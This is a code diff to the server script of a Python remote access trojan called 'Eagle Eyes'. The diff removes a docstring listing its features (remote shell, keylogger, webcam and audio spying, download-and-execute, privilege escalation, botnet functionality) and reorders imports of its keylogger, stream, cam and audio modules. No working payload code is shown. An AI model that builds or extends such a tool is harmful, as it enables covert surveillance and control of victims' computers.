@@ -1,47 +1,17 @@
-"""
-	Eagle Eyes => A powerful low level TCP networking RAT written in the Python langauge for Windows.
-	______________________________________________________
-	Supported Features:
-		* TCP Network stream (IPv4)
-		* Compression & AES256 Encryption
-		* Multi Threaded
-		* Remote Shell
-		  * Command Threading
-			* Command Visualization
-			* Command Backup
-		* Desktop Stream
-		* Cam Stream
-		* Audio Listener
-		* Audio Output
-		* Keylogger
-			* Logs Visualization
-		* Screenshot
-		* Webcam Screenshot
-		* Show Messagebox
-		* Visit Website
-		* Upload (& Execute)
-		* Download (& Execute)
-		* Botnet like functionality
-		* Privilege Escalation
-		* Service Creation
-		* System Information
-		* Location Data
-"""
-
-
+import threading
+import argparse
+import shutil
 import socket
 import pickle
 import zlib
-import os
-import threading
 import time
-import shutil
-import argparse
-from PIL import Image
-from queue import Queue
-from subprocess import Popen, PIPE
-from win10toast import ToastNotifier
+import os
+
 from colorama import init, Fore, Style
+from win10toast import ToastNotifier
+from subprocess import Popen, PIPE
+from queue import Queue
+from PIL import Image
 init()
 
 
@@ -67,13 +37,13 @@ print(Style.RESET_ALL, end='')
 from Utilities.db_queries import *
 update_db(args.use_latest, args.internet_protocol, args.port, args.module_ports)
 from Specific.encrypt import Encryption
+from Modules.Servers.keylogger import *
+from Modules.Servers.stream import *
+from Modules.Servers.audio import *
+from Modules.Servers.talk import *
+from Modules.Servers.cam import *
 from Specific.mail import Email
 from Utilities.server import *
-from Modules.Servers.stream import *
-from Modules.Servers.cam import *
-from Modules.Servers.audio import *
-from Modules.Servers.keylogger import *
-from Modules.Servers.talk import *
 
 
 class Server:
